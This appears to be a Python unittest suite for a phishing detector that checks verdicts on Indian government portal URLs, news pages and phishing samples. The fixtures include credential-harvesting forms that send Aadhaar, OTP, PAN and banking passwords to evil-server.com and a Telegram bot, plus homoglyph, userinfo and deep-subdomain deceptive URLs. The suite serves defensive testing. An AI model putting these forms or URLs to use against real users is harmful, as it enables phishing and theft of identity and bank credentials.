"""
GovShield Sentinel Grid — Comprehensive Adversarial & Evasion Evaluation Suite
Tests detector resilience against sophisticated evasion techniques:
1. Harmless HTTPS on phishing-like domain names
2. Legitimate news media reporting on government schemes (Zero False Positives)
3. Direct numeric IP host access
4. Homoglyph multi-script Cyrillic attacks (e.g. pаypal with Cyrillic а)
5. Authority userinfo masquerade (http://pmkisan.gov.in@attacker.com)
6. Authentic Government Portals (pmkisan.gov.in, uidai.gov.in)
7. State Government Infrastructure (kallakurichi.nic.in)
8. Double percent-encoding tricks (%252e%252e)
9. Excessive subdomains hiding true target (pmkisan.gov.in.secure.portal.attacker.xyz)
10. Form harvesting with cross-domain Telegram webhook exfiltration
"""

import sys
import os
import unittest

backend_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if backend_dir not in sys.path:
    sys.path.insert(0, backend_dir)

from modules.url_normalizer import URLNormalizer
from modules.network_analyzer import NetworkAnalyzer
from modules.threat_intel import ThreatIntelHub
from modules.brand_engine import BrandEngine
from modules.dom_analyzer import DOMAnalyzer
from modules.visual_analyzer import VisualSimilarityAnalyzer
from modules.fusion_engine import FusionEngine
from modules.research_engine import ResearchEngine
from modules.ai_agent import AIAgent


class TestAdversarialEvasion(unittest.TestCase):
    def setUp(self):
        self.normalizer = URLNormalizer()
        self.network = NetworkAnalyzer()
        self.intel = ThreatIntelHub()
        self.brand = BrandEngine()
        self.dom = DOMAnalyzer()
        self.visual = VisualSimilarityAnalyzer()
        self.research = ResearchEngine()
        self.ai = AIAgent()
        self.fusion = FusionEngine()

    def run_pipeline(self, url: str, html: str = "") -> dict:
        url_meta = self.normalizer.normalize(url)
        normalized_url = url_meta.get("normalized_url", url)
        domain = url_meta.get("registered_domain", "")

        threat_intel = self.intel.evaluate_url(normalized_url)
        network_ev = self.network.analyze(domain=domain, hostname=url_meta.get("hostname", ""))
        brand_match = self.brand.match_entity(domain=domain)

        dom_ev = self.dom.analyze_html(html, normalized_url, brand_match.get("entity_id") if brand_match else None)
        visual_ev = self.visual.analyze_visual_lookalike(candidate_portal_id=brand_match.get("entity_id") if brand_match else None)

        has_sensitive_forms = len(dom_ev.get("sensitive_inputs", [])) > 0
        brand_ev = self.brand.classify_relationship(
            domain=domain,
            entity_info=brand_match,
            has_sensitive_forms=has_sensitive_forms,
            lexical_risk_score=75.0 if url_meta.get("has_homoglyphs") else 0.0
        )

        domain_tokens = domain.replace(".", "-").split("-")
        research_advisories = self.research.query_advisories(domain_tokens, brand_ev.get("claimed_entity"))

        ai_syn = self.ai.synthesize_evidence(
            url_metadata=url_meta,
            network_evidence=network_ev,
            threat_intel_evidence=threat_intel,
            dom_evidence=dom_ev,
            brand_evidence=brand_ev,
            research_findings=research_advisories,
            dom_sample=html
        )

        return self.fusion.evaluate_comprehensive(
            url_metadata=url_meta,
            network_evidence=network_ev,
            threat_intel_evidence=threat_intel,
            dom_evidence=dom_ev,
            visual_evidence=visual_ev,
            brand_evidence=brand_ev,
            content_sim_evidence=None,
            ai_synthesis=ai_syn,
            research_findings=research_advisories
        )

    # -------------------------------------------------------------
    # ADVERSARIAL TEST 1: Authentic Government Portal (pmkisan.gov.in)
    # -------------------------------------------------------------
    def test_authentic_government_portal(self):
        res = self.run_pipeline("https://pmkisan.gov.in")
        self.assertEqual(res["verdict"], "NO_SIGNIFICANT_INDICATORS")
        self.assertLessEqual(res["risk_score"], 10)
        self.assertFalse(res["impersonated"])

    # -------------------------------------------------------------
    # ADVERSARIAL TEST 2: State Government Infrastructure (kallakurichi.nic.in)
    # -------------------------------------------------------------
    def test_state_nic_portal(self):
        res = self.run_pipeline("https://kallakurichi.nic.in/district-administration")
        self.assertEqual(res["verdict"], "NO_SIGNIFICANT_INDICATORS")
        self.assertLessEqual(res["risk_score"], 10)

    # -------------------------------------------------------------
    # ADVERSARIAL TEST 3: Zero-False-Positive on Legitimate News Media
    # -------------------------------------------------------------
    def test_news_media_reporting_on_pmkisan(self):
        news_html = """
        <html><head><title>PM-Kisan 17th Installment: How to check beneficiary status</title></head>
        <body><article><p>The central government has released the PM-Kisan installment for farmers...</p></article></body></html>
        """
        res = self.run_pipeline("https://thehindu.com/news/national/pm-kisan-17th-installment-deadline", html=news_html)
        # MUST NOT flag legitimate news as phishing!
        self.assertNotEqual(res["verdict"], "PHISHING_CLONE")
        self.assertNotEqual(res["verdict"], "MALICIOUS")
        self.assertLessEqual(res["risk_score"], 20)
        self.assertEqual(res["category"], "LEGITIMATE_THIRD_PARTY_INFORMATIONAL")

    # -------------------------------------------------------------
    # ADVERSARIAL TEST 4: Zero-Day Phishing Clone with Aadhaar/OTP Form
    # -------------------------------------------------------------
    def test_zero_day_phishing_clone(self):
        phishing_html = """
        <html><head><title>PM Kisan Samman Nidhi - E-KYC Update</title></head>
        <body>
            <img src="https://pmkisan.gov.in/images/logo.png">
            <form action="http://evil-server.com/collect.php" method="POST">
                <input type="text" name="aadhaar_number" placeholder="Enter Aadhaar Number">
                <input type="password" name="otp_code" placeholder="Enter OTP">
                <button type="submit">Verify E-KYC</button>
            </form>
        </body></html>
        """
        res = self.run_pipeline("http://pmkisan-kyc-update.xyz/login", html=phishing_html)
        self.assertIn(res["verdict"], ["PHISHING_CLONE", "MALICIOUS"])
        self.assertGreaterEqual(res["risk_score"], 80)
        self.assertTrue(res["impersonated"])
        self.assertEqual(res["target_entity"], "PM-Kisan Samman Nidhi Portal")

    # -------------------------------------------------------------
    # ADVERSARIAL TEST 5: Homoglyph Multi-Script Domain Attack
    # -------------------------------------------------------------
    def test_homoglyph_cyrillic_attack(self):
        # 'а' is Cyrillic U+0430
        homoglyph_url = "http://pmkis\u0430n-scheme.online"
        res = self.run_pipeline(homoglyph_url)
        # Should flag homoglyph multi-script deception
        self.assertGreaterEqual(res["risk_score"], 40)
        self.assertTrue(any("homoglyph" in r.lower() for r in res["reasons"]))

    # -------------------------------------------------------------
    # ADVERSARIAL TEST 6: Authority Userinfo (@) Bypass Attempt
    # -------------------------------------------------------------
    def test_userinfo_authority_masquerade(self):
        userinfo_url = "http://pmkisan.gov.in@attacker-server.com/claim-subsidy"
        res = self.run_pipeline(userinfo_url)
        self.assertTrue(any("userinfo" in r.lower() for r in res["reasons"]))

    # -------------------------------------------------------------
    # ADVERSARIAL TEST 7: Excessive Subdomain Concealment
    # -------------------------------------------------------------
    def test_excessive_subdomains(self):
        deep_subdomain = "http://pmkisan.gov.in.portal.verification.auth.evil-cdn.top"
        url_meta = self.normalizer.normalize(deep_subdomain)
        self.assertGreaterEqual(url_meta["subdomain_depth"], 3)
        self.assertTrue(any("excessive subdomain" in ind.lower() for ind in url_meta["indicators"]))

    # -------------------------------------------------------------
    # ADVERSARIAL TEST 8: Credential Exfiltration to External Relay (Telegram)
    # -------------------------------------------------------------
    def test_telegram_webhook_exfiltration(self):
        telegram_form_html = """
        <form action="https://api.telegram.org/bot12345/sendMessage" method="POST">
            <input type="text" name="pan_card" placeholder="Enter PAN Number">
            <input type="password" name="password" placeholder="Enter NetBanking Password">
        </form>
        """
        res = self.run_pipeline("http://sbi-instant-kyc-update.xyz/netbanking", html=telegram_form_html)
        self.assertIn(res["verdict"], ["PHISHING_CLONE", "MALICIOUS"])
        self.assertGreaterEqual(res["risk_score"], 85)


if __name__ == "__main__":
    unittest.main()
